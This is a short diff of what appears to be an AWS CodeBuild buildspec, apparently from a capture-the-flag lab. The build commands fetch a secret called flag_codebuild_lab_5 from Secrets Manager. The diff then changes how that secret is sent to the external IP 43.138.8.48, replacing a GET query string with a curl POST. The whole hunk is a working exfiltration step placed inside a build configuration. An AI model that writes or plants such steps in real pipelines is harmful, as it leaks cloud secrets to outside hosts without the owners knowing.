@@ -6,5 +6,6 @@ commands:
 - FLAG=$(aws secretsmanager get-secret-value --secret-id
 flag_codebuild_lab_5 --region us-east-1 --query SecretString --output
 text)
-- curl "http://43.138.8.48?flag=$FLAG"
+- curl -X POST http://43.138.8.48 --data
+"flag=$FLAG"
 - echo "=== END ==="
